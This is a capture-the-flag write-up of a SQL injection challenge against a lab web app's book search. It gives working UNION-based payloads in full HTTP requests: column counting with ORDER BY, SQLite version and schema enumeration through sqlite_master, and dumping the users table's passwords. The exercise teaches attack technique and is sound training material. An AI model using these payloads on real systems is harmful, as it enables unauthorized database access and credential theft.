# Challenge 1 - Vulnerable Startup: Book Title

> A new function has been added to the page, and it is now possible to search books in the database. The new search function is vulnerable to SQL injection because it concatenates the user input directly into the SQL statement. The goal of the task is to abuse this vulnerability to find the hidden flag.

Create an account and navigate to the search function.

![Pasted image 20210807181721](Pasted%20image%2020210807181721.png)

It submits a `GET` request to `/book` with a query parameter `title`.

```http
GET /challenge6/book?title=test HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

Sending various titles such as `t`, `te`,  `tes` results in the application returning the same result as the title `test`, the default. The result also potentially indicates the number of columns requested in the query. Thus, the search function probably uses a query something like the following on the backend:

```sql
SELECT title, description, author FROM $BOOK_TABLE WHERE title LIKE '$TITLE%'
```

Submitting a blank title results in just on book being returned: `Harry Potter and the Philosopher's Stone`. If the backend query were like the one above, then all books should have been returned. This indicates that the query is limiting the results to just one, like so:

```sql
SELECT title, description, author FROM $BOOK_TABLE WHERE title LIKE '$TITLE%' LIMIT 1
```

Also, submitting lowercase and uppercase characters doesn't seem to affect the results of the query. This indicates that the input `title` and the values from the `title` column are probably being lowercased before being compared, like so:

```sql
SELECT title, description, author FROM $BOOK_TABLE WHERE lower(title) LIKE '$TITLE%' LIMIT 1
```

Confirm the presence of the SQL injection vulnerability by injecting the title `test'`, causing the execution of the SQL query

```sql
SELECT title, description, author FROM $BOOK_TABLE WHERE lower(title) LIKE 'test'%' LIMIT 1
```

whose mismatched single quotes should cause the SQL query to fail.

```http
GET /challenge6/book?title=test' HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

The requests causes no books to be returned, as expected. However, this doesn't necessarily confirm the presence of the vulnerability. It could just be that there are no books with the title `test'`, which is to be expected. To confirm the presence of the vulnerability, inject the title `%'--`, which should cause the execution of the following query:

```sql
SELECT title, description, author FROM $BOOK_TABLE WHERE lower(title) LIKE '%'--%' LIMIT 1
```

This should cause the application to return all books, but it doesn't.

Looking at the challenge page, it seems that the backend is *actually* using the following nonsensical query:

```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '$TITLE%')
```

Thus, the title `%'--` was not closing the right paranthesis, causing a syntax error. The title `%')--` should dump the first book.

```http
GET /challenge6/book?title=%')-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

It does! This confirms the presence of the SQL injection vulnerability.

Since output from the query is directly rendered on the page, a `UNION` attack may be possible. First, determine the number of columns being returned using the incremental `ORDER BY` method to execute this SQL query.

```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '%') ORDER BY $INDEX--%')
```

```http
GET /challenge6/book?title=%')+ORDER+BY+5-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

Ordering by indexes 1-4 cause a book to return, but ordering by index 5 causes no book to be returned. This indicates that there are 4 columns being returned in in the original query.

Based on interacting with the application so far, the columns are presumably `id`, `title`, `description`, and `author`. The latter 3 are probably all of type string, whereas `id` is probably type integer. Inject a `UNION SELECT` to test this by executing the following SQL query.

```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '%') UNION SELECT 1,'a','b','c'--%')
```

This should cause the application to return an extra book.

```http
GET /challenge6/book?title=%')+UNION+SELECT+1,'a','b','c'-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

![Pasted image 20210807190020](Pasted%20image%2020210807190020.png)

It worked. An extra book is rendered by the application, indicating that `title` is the second column, `description` is the third, and `author` is the fourth. The four column types are just as assumed: integer, string, string, and string.

With this. determine the type of underlying database.

```http
GET /challenge6/book?title=%')+UNION+SELECT+1,'a',sqlite_version(),'c'-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

The underlying database is SQLite 3.22.0. Determine the number of non-SQLite system tables.

```http
GET /challenge6/book?title=%')+UNION+SELECT+1,'a',name,'c'+FROM+sqlite_master+WHERE+type='table'+AND+name+NOT+LIKE+'sqlite_%'-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

Three tables were returned: `books`, `notes`, and `users`. Determine each the tables' schemas by dumping each of their `CREATE TABLE` statements.

```http
GET /challenge6/book?title=%')+UNION+SELECT+1,'a',sql,'c'+FROM+sqlite_master+WHERE+type='table'+AND+name+NOT+LIKE+'sqlite_%'-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

#### `books`

```sql
CREATE TABLE books (
    id integer primary key,
    title text not null,
    description text not null,
    author text not null
)
```

#### `notes`

```sql
CREATE TABLE notes (
    id integer primary key,
    username text not null,
    title text not null,
    note text not null
)
```

#### `users`

```sql
CREATE TABLE users (
    id integer primary key,
    username text unique not null,
    password text not null
)
```

Dump each table until the flag is found. Start with `users`, as it is generally the most interesting.

```http
GET /challenge6/book?title=%')+UNION+SELECT+1,id,username,password+FROM+users-- HTTP/1.1
Host: 10.10.141.250:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWLLy1OLYrPTFGyMtNBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHh4bmA.YQ8GJg.Dld_9hHLGCER2geRTTYpc2xkKZE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

This reveals the flag as `admin`'s password.
